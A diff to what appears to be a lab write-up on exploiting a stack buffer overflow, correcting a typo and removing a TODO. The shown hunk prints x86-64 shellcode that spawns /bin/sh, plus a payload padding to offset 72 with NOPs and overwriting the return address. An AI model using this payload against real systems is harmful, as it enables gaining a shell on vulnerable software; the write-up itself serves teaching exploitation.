@@ -122,7 +122,6 @@ $ pipx install pwntools
 
 ## Scanning for vulnerabilities
 
-**TODO**
 
 Instead of looking through the code manually the code was scanned for a list of functions, vulnerable to buffer overflows, using [ripgrep](https://github.com/BurntSushi/ripgrep) `rg` for short. `rg` scans all files in a directory, including sub-directories, for a given string and outputs the file in which the string was found as well as the line containing the string and the corresponding line number.
 
@@ -437,7 +436,7 @@ To overflow the buffer and set the return address to that of the start address o
 We can see that the starting address of the buffer is `0x00007fffffffd2c0`. With this information the following payload was crafted:
 
 ```Python
-hellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
 payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd2c0)
 ```
 First the shellcode is placed in the buffer, then the buffer is overflown using the `\x90` (nop) bytes up to the offset where we need to write the wanted return address, lastly the return address is written to the stack.
